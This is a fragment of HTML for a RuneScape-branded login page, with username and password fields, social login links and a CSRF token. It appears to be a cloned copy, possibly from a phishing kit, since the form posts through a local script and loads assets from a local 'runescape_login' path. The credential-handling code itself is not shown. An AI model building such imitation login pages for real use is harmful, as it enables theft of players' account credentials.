<body class=" p-login" id="p-login">
<main class="l-vista l-vista--size-narrow" data-value="200">
    <div class="l-vista__central">
        <div class="l-vista__container " id="l-vista__container">
            <div class="l-vista__logo">
                <a href="http://www.runescape.com/" id="rs-logo-home">
                    <img src="/static/runescape_login/img/oldschool.png"

                         alt="RuneScape Logo" title="RuneScape"/>
                </a>
            </div>
            <form class="login-form" id="login-form" data-abide="qjgh68-abide" novalidate=""
                  onsubmit="login(event)">
                <label class="login-form__label" id="label-username">
                    Email / Username:
                    <input class="login-form__text" type="text" name="text_username" id="login-username" maxlength="200"
                           title="Enter your Email / Username:" value="" autofocus="" autocomplete="username"
                           required="">
                    <span class="form-error" id="span-username">
                                This field is required.
                            </span>
                </label>
                <label class="login-form__label" id="label-password">
                    Password:
                    <input class="login-form__text" type="password" name="text_password" id="login-password"
                           maxlength="20" title="Enter your password" required="">
                    <span class="form-error" id="span-password">
                                This field is required.
                            </span>
                </label>
                <button class="a-button a-button--size-full" name="button_login" value="submit"
                        id="rs-login-submit"
                        type="submit">Log In
                </button>
                <input type="hidden" value="www" name="mod">
                <input type="hidden" value="0" name="ssl">
                <input type="hidden" value="community" name="dest">
                <input type="hidden" name="csrfmiddlewaretoken" value="A7k8QHGUxcjjwsCoLuuoMiMWKoUCOqB1R0VTHOV1jyavRRHUXcpC3hiqpbtaXqCe">
            </form>
            <div class="login-additional">
                <a class="login-additional__cannot" href="https://www.runescape.com/cant_log_in" target="_parent"
                   id="login-cannot">Can't Log In?</a>
                <div class="login-social">

                    <a href="https://auth.jagex.com/google/v1/social/login/en?correlationId=https%3Awww%3Acommunity"
                       id="googlelogin" class="a-social-button a-social-button--service-google" target="_parent"
                       data-test="google-login">
                        Log in with Google
                    </a>


                    <a href="https://auth.jagex.com/apple/v1/social/login/en?correlationId=https%3Awww%3Acommunity"
                       id="apple-blacklogin" class="a-social-button a-social-button--service-apple-black"
                       target="_parent" data-test="apple-black-login">
                        Log in with Apple
                    </a>


                    <a href="https://social.auth.jagex.com/v1/login?provider=steam-web&amp;clientLanguageCode=en&amp;callbackUrl=https%3A%2F%2Fsecure.runescape.com%2Fm%3Dweblogin%2Flogin%3Fredirto%3Dhttps%253Awww%253Acommunity%26theme%3Drunescape%26flow%3Dweb&amp;errorCallbackUrl=https%3A%2F%2Fsecure.runescape.com%2Fm%3Dweblogin%2FsocialError%3Fredirto%3Dhttps%253Awww%253Acommunity%26theme%3Drunescape%26flow%3Dweb"
                       id="steamlogin" class="a-social-button a-social-button--service-steam" target="_parent"
                       data-test="steam-login">
                        Log in with Steam
                    </a>


                    <a href="https://secure.runescape.com/m=sn-integration/facebook/gamelogin.ws?mod=www&amp;ssl=1&amp;dest=community"
                       id="facebookloginNew" class="a-social-button a-social-button--service-facebook" target="_parent"
                       data-test="facebook-login">Log in with Facebook</a>

                <span class="login-additional__not-registered">Not registered?</span><br/>
                <a class="login-additional__create"
                   href="https://secure.runescape.com/m=account-creation/create_account" target="_parent"
                   id="login-create">Create an account</a>
